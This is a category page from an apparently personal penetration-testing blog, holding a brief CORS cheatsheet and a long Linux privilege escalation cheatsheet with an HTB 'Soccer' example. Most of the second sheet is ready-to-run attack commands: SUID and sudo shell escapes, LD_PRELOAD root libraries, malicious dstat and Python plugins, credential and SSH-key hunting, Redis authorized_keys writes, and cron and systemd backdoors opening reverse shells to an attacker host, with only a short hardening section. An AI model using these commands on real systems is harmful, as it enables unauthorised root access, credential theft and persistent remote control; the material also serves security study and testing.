<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Cheatsheets | realspaceeagle</title>
<meta name="keywords" content="">
<meta name="description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">
<meta name="author" content="realspaceeagle">
<link rel="canonical" href="https://realspaceeagle.github.io/categories/cheatsheets/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="icon" type="image/png" sizes="16x16" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="icon" type="image/png" sizes="32x32" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="apple-touch-icon" href="https://realspaceeagle.github.io/favicon.svg">
<link rel="mask-icon" href="https://realspaceeagle.github.io/favicon.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" type="application/rss+xml" href="https://realspaceeagle.github.io/categories/cheatsheets/index.xml" title="rss">
<link rel="alternate" hreflang="en" href="https://realspaceeagle.github.io/categories/cheatsheets/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>

<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="realspaceeagle">
<meta name="robots" content="index, follow">
<meta name="viewport" content="width=device-width, initial-scale=1.0">


<link rel="canonical" href="https://realspaceeagle.github.io/categories/cheatsheets/">


<meta property="og:title" content="Cheatsheets">
<meta property="og:description" content="">
<meta property="og:url" content="https://realspaceeagle.github.io/categories/cheatsheets/">
<meta property="og:site_name" content="realspaceeagle">
<meta property="og:locale" content="en_US"><meta property="og:type" content="website"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
  <meta property="og:image:alt" content="realspaceeagle">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@haran_loga">
<meta name="twitter:creator" content="@haran_loga">
<meta name="twitter:title" content="Cheatsheets">
<meta name="twitter:description" content=""><meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
  <meta name="twitter:image:alt" content="realspaceeagle">
<script type="application/ld+json">
{
  "@context": "https://schema.org","@type": "WebPage",
  "name": "Cheatsheets",
  "description": "",
  "url": "https:\/\/realspaceeagle.github.io\/categories\/cheatsheets\/",
  "publisher": {
    "@type": "Person",
    "name": "realspaceeagle",
    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
    "url": "https:\/\/realspaceeagle.github.io\/"
  }}
</script>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position": 1,
      "name": "Home",
      "item": "https:\/\/realspaceeagle.github.io\/"
    }]
}
</script>


<link rel="stylesheet" href="/css/terminal-style.css">


<link rel="stylesheet" href="/css/scroll-enhancement.css">


<link rel="stylesheet" href="/css/mobile-navigation.css">


<link rel="stylesheet" href="/css/mobile-responsive-pages.css">


<link rel="stylesheet" href="/css/header-width-fix.css">


<link rel="stylesheet" href="/css/share-buttons.css">


<link rel="stylesheet" href="/css/comments.css">


<link rel="stylesheet" href="/css/blog-enhancements.css">


<link rel="stylesheet" href="/css/blog-sidebar.css">


<link rel="stylesheet" href="/css/project-toggle.css">


<link rel="stylesheet" href="/css/code-copy-enhancements.css">


<link rel="stylesheet" href="/css/ctf-writeup.css">


<link rel="stylesheet" href="/css/github-stats.css">


<link rel="stylesheet" href="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar-responsive.css" onerror="this.remove();" />
<script src="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar.min.js" onerror="this.remove();"></script>


<script src="/js/github-calendar-enhanced.js" defer></script>


<script src="/js/github-contribution-tracker.js" defer></script>


<script src="/js/github-api-fallback.js" defer></script>


<script src="/js/github-integration.js" defer></script>


<script src="/js/twitter-timeline.js" defer></script>
<script src="/js/twitter-manual.js" defer></script>


<script src="/js/code-copy-enhanced.js" defer></script>





      <script async src="https://www.googletagmanager.com/gtag/js?id=G-GPTRZ14YZS"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-GPTRZ14YZS');
        }
      </script><meta property="og:url" content="https://realspaceeagle.github.io/categories/cheatsheets/">
  <meta property="og:site_name" content="realspaceeagle">
  <meta property="og:title" content="Cheatsheets">
  <meta property="og:description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="website">
      <meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
<meta name="twitter:title" content="Cheatsheets">
<meta name="twitter:description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">

</head>

<body class="list" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }
</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://realspaceeagle.github.io/" accesskey="h" title="realspaceeagle (Alt + H)">realspaceeagle</a>
            
            
            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu">
                <span class="hamburger-line"></span>
                <span class="hamburger-line"></span>
                <span class="hamburger-line"></span>
            </button>
            
            <div class="logo-switches">
                
                <div class="social-icons">
                    <a href="https://www.linkedin.com/in/dream4ip/" target="_blank" rel="noopener noreferrer" 
                       title="Connect on LinkedIn" aria-label="LinkedIn Profile" class="social-link">
                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
                        </svg>
                    </a>
                    <a href="https://twitter.com/haran_loga" target="_blank" rel="noopener noreferrer" 
                       title="Follow on X/Twitter" aria-label="Twitter Profile" class="social-link">
                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                        </svg>
                    </a>
                    <a href="https://github.com/realspaceeagle" target="_blank" rel="noopener noreferrer" 
                       title="View Code on GitHub" aria-label="GitHub Profile" class="social-link">
                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
                        </svg>
                    </a>
                </div>
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        
        <ul id="menu" class="desktop-menu">
            <li>
                <a href="https://realspaceeagle.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
                    <span>Cheatsheets</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="https://realspaceeagle.github.io/contact/" title="Contact">
                    <span>Contact</span>
                </a>
            </li>
        </ul>
        
        
        <div id="mobile-menu" class="mobile-menu">
            <ul class="mobile-menu-list">
                <li>
                    <a href="https://realspaceeagle.github.io/" title="Home">
                        <span>Home</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/about/" title="About">
                        <span>About</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/archives/" title="Archives">
                        <span>Archives</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
                        <span>Cheatsheets</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/search/" title="Search" accesskey=/>
                        <span>Search</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/tags/" title="Tags">
                        <span>Tags</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/categories/" title="Categories">
                        <span>Categories</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/projects/" title="Projects">
                        <span>Projects</span>
                    </a>
                </li>
                <li>
                    <a href="https://realspaceeagle.github.io/contact/" title="Contact">
                        <span>Contact</span>
                    </a>
                </li>
            </ul>
        </div>
    </nav>
</header>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
    const mobileMenu = document.getElementById('mobile-menu');
    const body = document.body;
    
    if (mobileMenuToggle && mobileMenu) {
        mobileMenuToggle.addEventListener('click', function() {
            const isOpen = mobileMenu.classList.contains('active');
            
            if (isOpen) {
                mobileMenu.classList.remove('active');
                mobileMenuToggle.classList.remove('active');
                body.classList.remove('mobile-menu-open');
            } else {
                mobileMenu.classList.add('active');
                mobileMenuToggle.classList.add('active');
                body.classList.add('mobile-menu-open');
            }
        });
        
        
        const mobileMenuLinks = mobileMenu.querySelectorAll('a');
        mobileMenuLinks.forEach(link => {
            link.addEventListener('click', function() {
                mobileMenu.classList.remove('active');
                mobileMenuToggle.classList.remove('active');
                body.classList.remove('mobile-menu-open');
            });
        });
        
        
        document.addEventListener('click', function(event) {
            if (!mobileMenu.contains(event.target) && !mobileMenuToggle.contains(event.target)) {
                mobileMenu.classList.remove('active');
                mobileMenuToggle.classList.remove('active');
                body.classList.remove('mobile-menu-open');
            }
        });
    }
});
</script><main class="main"> 
<header class="page-header"><div class="breadcrumbs"><a href="https://realspaceeagle.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://realspaceeagle.github.io/categories/">Categories</a></div>
  <h1>
    Cheatsheets
  </h1>
</header>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">CORS Cheatsheet
    </h2>
  </header>
  <div class="entry-content">
    <p>CORS Cheatsheet Evaluation Checklist Inspect all Access-Control-* headers in the response. Map the origin reflection rules (Access-Control-Allow-Origin). Check whether credentials are allowed (Access-Control-Allow-Credentials: true). Test both simple and preflighted requests. Record browser console output for rejected preflights. Common Misconfigurations Pattern Risk Access-Control-Allow-Origin: * with credentials allowed Full privilege leakage Origin reflection using Origin: https://subdomain.attacker.com Arbitrary origin escalation Access-Control-Allow-Headers: * Arbitrary header injection Missing Vary: Origin Cache poisoning Simple Exploit Template fetch(&#39;https://target.app/api/profile&#39;, { credentials: &#39;include&#39; }) .then(res =&gt; res.text()) .then(console.log); Preflight Control fetch(&#39;https://target.app/api/update&#39;, { method: &#39;POST&#39;, credentials: &#39;include&#39;, headers: { &#39;Content-Type&#39;: &#39;application/json&#39;, &#39;X-Api-Version&#39;: &#39;2&#39; }, body: JSON.stringify({ plan: &#39;pro&#39; }) }); Testing Tips For wildcard origins, send Origin: https://evil.test. Validate response headers for each interesting endpoint (REST, GraphQL, legacy). Leverage the browser devtools network inspector to capture preflight failures. Use curl with -H &#34;Origin:&#34; to reproduce outside the browser. Secure Defaults Explicitly list allowed origins. Only allow credentials when required and limit to trusted origins. Restrict methods to the minimal set (GET, POST, etc.). Restrict headers to required custom headers only. Ensure sensitive endpoints require server-side authorization beyond CORS. Coordinate findings with application owners: CORS is an access control layer, not a standalone security control.
</p>
  </div>
  <footer class="entry-footer"><span title='2024-01-01 00:00:00 +0000 UTC'>January 1, 2024</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
  <a class="entry-link" aria-label="post link to CORS Cheatsheet" href="https://realspaceeagle.github.io/cheatsheets/cors/"></a>
</article>

<article class="post-entry tag-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">Linux Privilege Escalation Cheatsheet
    </h2>
  </header>
  <div class="entry-content">
    <p>Linux Privilege Escalation Cheatsheet Initial Enumeration System Information # Basic system info uname -a cat /etc/os-release cat /etc/issue hostname # Current user context id whoami groups cat /etc/passwd | grep sh # Environment variables env printenv echo $PATH User and Group Enumeration # List all users cat /etc/passwd # Users with login shells cat /etc/passwd | grep sh # Current user privileges sudo -l find / -user $(whoami) 2&gt;/dev/null | grep -v &#39;^/proc\|^/run\|^/sys&#39; find / -group $(whoami) 2&gt;/dev/null | grep -v &#39;^/proc\|^/run\|^/sys&#39; # Check for interesting group memberships groups id # Find files owned by current user find / -user $(id -u) 2&gt;/dev/null find / -group $(id -g) 2&gt;/dev/null SUID and SGID Analysis Finding SUID/SGID Binaries # Find SUID binaries find / -perm -u=s -type f 2&gt;/dev/null find / -perm -4000 -type f 2&gt;/dev/null # Find SGID binaries find / -perm -g=s -type f 2&gt;/dev/null find / -perm -2000 -type f 2&gt;/dev/null # Find both SUID and SGID find / -perm -u=s -o -perm -g=s -type f 2&gt;/dev/null # Common SUID binaries to check ls -la /usr/bin/passwd ls -la /usr/bin/sudo ls -la /usr/bin/su ls -la /usr/local/bin/doas GTFOBins Exploitation # Check GTFOBins for binary exploitation # https://gtfobins.github.io/ # Common exploitable SUID binaries: # - /usr/bin/find find . -exec /bin/sh -p \; -quit # - /usr/bin/vim vim -c &#39;:!/bin/sh&#39; # - /usr/bin/less less /etc/profile !/bin/sh # - /usr/bin/more more /etc/profile !/bin/sh # - /usr/bin/nmap (older versions) nmap --interactive !sh # - /usr/bin/awk awk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39; doas Privilege Escalation doas Configuration Analysis # Find doas binary and configuration find / -name doas 2&gt;/dev/null find / -name doas.conf 2&gt;/dev/null # Common doas locations ls -la /usr/local/bin/doas ls -la /usr/local/etc/doas.conf # Check doas configuration cat /usr/local/etc/doas.conf # Example vulnerable configuration: # permit nopass player as root cmd /usr/bin/dstat doas Exploitation Techniques # Basic doas command execution doas /usr/bin/dstat # Check what commands are allowed doas -n /usr/bin/dstat --help # If specific command is allowed, look for ways to abuse it # Example: dstat with custom plugins # doas with dstat privilege escalation # 1. Check if you can write to dstat plugin directory find / -group $(id -g) 2&gt;/dev/null | grep dstat ls -la /usr/local/share/dstat # 2. Create malicious dstat plugin echo &#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39; &gt; /usr/local/share/dstat/dstat_exploit.py # 3. Execute with doas doas /usr/bin/dstat --exploit doas vs sudo Differences # doas syntax doas command # doas with specific user doas -u root command # Check doas configuration syntax # permit [options] identity [as target] [cmd command [args ...]] # Common doas misconfigurations: # - permit nopass user as root cmd /path/to/binary # - Allowing commands that can spawn shells # - Wildcard permissions sudo Privilege Escalation sudo Enumeration # Check sudo privileges sudo -l # Check sudo version sudo --version # Common sudo misconfigurations: # - NOPASSWD entries # - Wildcard permissions # - Commands that allow shell escapes sudo Exploitation Examples # sudo with shell escape commands sudo vim :!/bin/bash sudo less /etc/profile !/bin/bash sudo find /etc -name &#34;*.conf&#34; -exec /bin/bash \; # sudo with environment variables sudo -E /bin/bash # sudo with LD_PRELOAD echo &#39;int main() { setgid(0); setuid(0); system(&#34;/bin/bash&#34;); return 0; }&#39; &gt; /tmp/exploit.c gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles sudo LD_PRELOAD=/tmp/exploit.so /bin/bash # sudo with LD_LIBRARY_PATH mkdir /tmp/lib echo &#39;int main() { setgid(0); setuid(0); system(&#34;/bin/bash&#34;); return 0; }&#39; &gt; /tmp/lib/exploit.c gcc -fPIC -shared -o /tmp/lib/libc.so.6 /tmp/lib/exploit.c sudo LD_LIBRARY_PATH=/tmp/lib /bin/bash Writable Directory Exploitation Finding Writable Directories # Find world-writable directories find / -type d -perm -002 2&gt;/dev/null # Find directories writable by current user find / -type d -writable 2&gt;/dev/null # Find directories owned by current user find / -type d -user $(whoami) 2&gt;/dev/null # Common locations to check ls -la /tmp ls -la /var/tmp ls -la /dev/shm ls -la /usr/local/share PATH Manipulation # Check current PATH echo $PATH # Create malicious binary in writable directory echo &#39;#!/bin/bash\n/bin/bash -p&#39; &gt; /tmp/ls chmod &#43;x /tmp/ls # Modify PATH to prioritize malicious binary export PATH=/tmp:$PATH # Wait for privileged process to execute our binary # Or trigger execution through cron jobs, scripts, etc. Library Hijacking # Check for writable library directories find / -type d -writable 2&gt;/dev/null | grep -E &#34;(lib|lib64)&#34; # Check LD_LIBRARY_PATH in processes ps aux | grep -i ld_library # Create malicious shared library echo &#39;void _init() { setgid(0); setuid(0); system(&#34;/bin/bash&#34;); }&#39; &gt; /tmp/exploit.c gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles # Place in writable library directory cp /tmp/exploit.so /writable/lib/directory/ Process and Service Analysis Running Processes # List all processes ps aux ps -ef --forest # Processes running as root ps aux | grep root # Network connections ss -tlnp netstat -tulnp # Check for processes with interesting capabilities /sbin/getcap -r / 2&gt;/dev/null Cron Jobs and Scheduled Tasks # System cron jobs cat /etc/crontab ls -la /etc/cron.* crontab -l # User cron jobs crontab -l cat /var/spool/cron/crontabs/* # Systemd timers systemctl list-timers find /etc/systemd -name &#34;*.timer&#34; Services and Sockets # Running services systemctl list-units --type=service --state=running # Check service files for misconfigurations find /etc/systemd -name &#34;*.service&#34; -exec grep -l &#34;User\|Group&#34; {} \; # Socket files systemctl list-units --type=socket find /etc/systemd -name &#34;*.socket&#34; File System Analysis Configuration Files # Check for readable sensitive files find /etc -readable -type f 2&gt;/dev/null | head -20 # Database configuration files find / -name &#34;*.conf&#34; -o -name &#34;*.config&#34; -o -name &#34;*.cfg&#34; 2&gt;/dev/null | grep -E &#34;(sql|db|database)&#34; # Web application configs find / -name &#34;wp-config.php&#34; -o -name &#34;config.php&#34; -o -name &#34;.env&#34; 2&gt;/dev/null # SSH keys and certificates find / -name &#34;id_rsa&#34; -o -name &#34;id_dsa&#34; -o -name &#34;*.pem&#34; -o -name &#34;*.key&#34; 2&gt;/dev/null Log Files # System logs find /var/log -readable -type f 2&gt;/dev/null # Application logs find / -name &#34;*.log&#34; -readable 2&gt;/dev/null | head -10 # Check logs for passwords or sensitive information grep -r -i &#34;password\|passwd\|secret\|token&#34; /var/log/ 2&gt;/dev/null Backup Files # Find backup files find / -name &#34;*.bak&#34; -o -name &#34;*.backup&#34; -o -name &#34;*.old&#34; -o -name &#34;*~&#34; 2&gt;/dev/null # Database backups find / -name &#34;*.sql&#34; -o -name &#34;*.dump&#34; -o -name &#34;*.db&#34; 2&gt;/dev/null # Configuration backups find /etc -name &#34;*.bak&#34; -o -name &#34;*.old&#34; -o -name &#34;*.orig&#34; 2&gt;/dev/null Application-Specific Exploits dstat Plugin Exploitation # Check dstat plugin directories find / -name &#34;*dstat*&#34; -type d 2&gt;/dev/null ls -la /usr/share/dstat ls -la /usr/local/share/dstat # Check permissions on plugin directory ls -la /usr/local/share/dstat # Create malicious dstat plugin cat &gt; /usr/local/share/dstat/dstat_exploit.py &lt;&lt; &#39;EOF&#39; import os os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;]) EOF # Execute with doas/sudo doas /usr/bin/dstat --exploit Python Library Hijacking # Check Python path python -c &#34;import sys; print(&#39;\n&#39;.join(sys.path))&#34; # Find writable Python directories python -c &#34;import sys; print(&#39;\n&#39;.join([p for p in sys.path if __import__(&#39;os&#39;).access(p, __import__(&#39;os&#39;).W_OK)]))&#34; # Create malicious module echo &#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39; &gt; /writable/python/path/exploit.py # Import in vulnerable application python -c &#34;import exploit&#34; Binary Wrapper Exploitation # Create wrapper script for allowed commands cat &gt; /tmp/malicious_script &lt;&lt; &#39;EOF&#39; #!/bin/bash /bin/bash -p EOF chmod &#43;x /tmp/malicious_script # If PATH manipulation is possible export PATH=/tmp:$PATH # Or create binary with same name as allowed command cp /bin/bash /tmp/allowed_binary_name Kernel and System Exploits Kernel Version Checking # Kernel version uname -r cat /proc/version # Check for known kernel exploits searchsploit linux kernel $(uname -r) # Distribution-specific exploits lsb_release -a cat /etc/os-release Common Kernel Exploits # Dirty COW (CVE-2016-5195) # Affects Linux kernel versions 2.6.22 to 4.8.3 # DirtyCOW PoC echo &#39;int main() { setuid(0); system(&#34;/bin/bash&#34;); return 0; }&#39; &gt; /tmp/cow.c gcc -o /tmp/cow /tmp/cow.c # Check for vulnerable kernel if [[ $(uname -r | cut -d. -f1-2) &lt; &#34;4.9&#34; ]]; then echo &#34;Potentially vulnerable to DirtyCOW&#34; fi Container Escape Techniques Docker Container Detection # Check if running in container cat /proc/1/cgroup | grep docker ls -la /.dockerenv # Check for container runtime ps aux | grep -E &#34;(docker|containerd|runc)&#34; # Check capabilities /sbin/getcap -r / 2&gt;/dev/null capsh --print Container Privilege Escalation # Check for privileged container cat /proc/self/status | grep Cap # Check for host filesystem mounts mount | grep -E &#34;/(proc|sys|dev)&#34; # Look for Docker socket find / -name &#34;docker.sock&#34; 2&gt;/dev/null # Check for host processes visible ps aux | wc -l Network-Based Privilege Escalation Internal Network Discovery # Network interfaces ip addr show ifconfig -a # ARP table arp -a ip neigh show # Network connections ss -tulnp netstat -tulnp # Port scanning internal network for i in {1..254}; do ping -c 1 192.168.1.$i &amp;&gt;/dev/null &amp;&amp; echo &#34;192.168.1.$i is up&#34;; done Service Exploitation # Check for internal services nmap -sT -O localhost ss -tlnp | grep LISTEN # Database connections mysql -u root -p psql -U postgres # Redis exploitation redis-cli CONFIG GET dir CONFIG SET dir /root/.ssh CONFIG SET dbfilename authorized_keys SET crackit &#34;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...&#34; SAVE Persistence Mechanisms SSH Key Injection # Generate SSH key pair ssh-keygen -t rsa -f /tmp/key # Add public key to authorized_keys echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...&#34; &gt;&gt; /root/.ssh/authorized_keys echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...&#34; &gt;&gt; /home/user/.ssh/authorized_keys # Set proper permissions chmod 600 /root/.ssh/authorized_keys chmod 700 /root/.ssh Cron Job Backdoors # Add malicious cron job echo &#34;* * * * * /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/attacker_ip/port 0&gt;&amp;1&#39;&#34; &gt;&gt; /etc/crontab # User-specific cron crontab -e # Add: * * * * * /path/to/backdoor Service Backdoors # Create systemd service cat &gt; /etc/systemd/system/backdoor.service &lt;&lt; &#39;EOF&#39; [Unit] Description=System Backdoor After=network.target [Service] Type=simple User=root ExecStart=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/attacker_ip/port 0&gt;&amp;1&#39; Restart=always [Install] WantedBy=multi-user.target EOF systemctl enable backdoor.service systemctl start backdoor.service Automated Enumeration Tools LinPEAS # Download and run LinPEAS curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Or transfer and run wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh chmod &#43;x linpeas.sh ./linpeas.sh LinEnum # Download LinEnum wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh chmod &#43;x LinEnum.sh ./LinEnum.sh LSE (Linux Smart Enumeration) # Download and run LSE wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh chmod &#43;x lse.sh ./lse.sh -l1 # Level 1 checks ./lse.sh -l2 # Level 2 checks Real-World Example: Soccer HTB doas/dstat Initial Discovery # Found user can write to dstat plugin directory player@soccer:/usr/local/share$ find / -group player 2&gt;/dev/null | grep -v &#39;^/proc\|^/run\|^/sys&#39; /usr/local/share/dstat # Check doas configuration player@soccer:~$ cat /usr/local/etc/doas.conf permit nopass player as root cmd /usr/bin/dstat # Check directory permissions player@soccer:/usr/local/share$ ls -la drwxrwx--- 2 root player 4096 Dec 12 2022 dstat Exploitation # Create malicious dstat plugin echo &#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39; &gt; /usr/local/share/dstat/dstat_exploit.py # Execute with doas doas /usr/bin/dstat --exploit # Alternative method using GTFOBins reference mkdir -p ~/.dstat echo &#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39; &gt; ~/.dstat/dstat_exploit.py doas /usr/bin/dstat --exploit Prevention and Hardening Secure Configuration Practices # Proper doas configuration # Use specific commands only, avoid wildcards permit nopass user as root cmd /usr/bin/specific-binary arg1 arg2 # Secure sudo configuration # Avoid NOPASSWD where possible # Use command aliases for complex commands # Regularly audit sudo rules # File permission hardening # Remove world-writable permissions find / -type d -perm -002 -exec chmod o-w {} \; find / -type f -perm -002 -exec chmod o-w {} \; Monitoring and Detection # Monitor privilege escalation attempts auditctl -w /etc/passwd -p wa -k passwd_changes auditctl -w /etc/shadow -p wa -k shadow_changes auditctl -w /etc/sudoers -p wa -k sudo_changes # Log sudo/doas usage # Configure proper logging in /etc/sudoers or doas.conf # File integrity monitoring # Use tools like AIDE or Tripwire to monitor critical files Always ensure you have proper authorization before attempting privilege escalation on any system. These techniques should only be used for legitimate security testing and system administration purposes.
</p>
  </div>
